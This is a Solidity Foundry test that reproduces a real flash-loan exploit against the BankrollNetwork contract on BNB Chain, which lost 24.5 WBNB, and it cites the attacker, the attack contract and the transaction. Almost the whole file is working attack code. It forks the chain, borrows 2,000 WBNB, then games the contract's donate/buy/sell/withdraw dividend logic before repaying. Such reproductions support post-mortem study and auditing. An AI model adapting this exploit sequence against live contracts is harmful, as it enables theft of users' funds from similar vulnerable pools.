// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 24.5 WBNB
// Attacker : https://bscscan.com/address/0x2dea406bb3bea68d6be8d9ef0071fdf63082fb52
// Attack Contract : https://bscscan.com/address/0xe63a5c681cacb8484c8a989cfdd41b8e3b7a2be2
// Vulnerable Contract : https://bscscan.com/address/0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e
// Attack Tx : https://bscscan.com/tx/0x7226b3947c7e8651982e5bd777bca52d03ea31d19b515dec123595a4435ae22c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e#code

// @Analysis
// Post-mortem : https://x.com/Phalcon_xyz/status/1943518566831296566
// Twitter Guy : https://x.com/TenArmorAlert/status/1935618109802459464
// Hacking God : N/A
pragma solidity ^0.8.0;

contract BankrollNetwork is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 51_715_418 - 1;
    uint256 borrow_amount;
    
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniswapV2Pair pair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IBankrollNetworkStack bankRollNetwork = IBankrollNetworkStack(0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e);
    

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(WBNB);
    }

    function testExploit() public balanceLog {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);

        borrow_amount = 2_000 ether;
        pair.swap(0, borrow_amount, address(this), "0x3030");

        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }
    
      
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        WBNB.approve(address(bankRollNetwork), type(uint256).max);
        
        emit log_named_decimal_uint("[Before] Attacker bank roll balance", bankRollNetwork.myTokens(), 0);
        emit log_named_decimal_uint("[Before] Attacker bank roll dividends", bankRollNetwork.myDividends(), 0);
                       
        bankRollNetwork.donatePool(1000 ether);
        
        bankRollNetwork.buy(240 ether);
        
        emit log_named_decimal_uint("[After] Attacker bank roll balance", bankRollNetwork.myTokens(), 0);
        emit log_named_decimal_uint("[After] Attacker bank roll dividends", bankRollNetwork.myDividends(), 0);
        
        bankRollNetwork.sell(bankRollNetwork.myTokens());
        
        uint256 topUp = 94064984776383565540;
        WBNB.transfer(address(bankRollNetwork), topUp);
        
        bankRollNetwork.withdraw();
        
        uint256 repay_amount = 2005200000000000000000;
        WBNB.transfer(address(pair), repay_amount);
}

	 receive() external payable {}
}
        
     interface IBankrollNetworkStack {
	function donatePool(uint256 tokenAmount) external;     
	function buy(uint256 tokenAmount) external returns (uint256);
	function sell(uint256 tokenAmount) external;
	function myTokens() external view returns (uint256);
	function myDividends() external view returns (uint256);
	function withdraw() external;
}
    

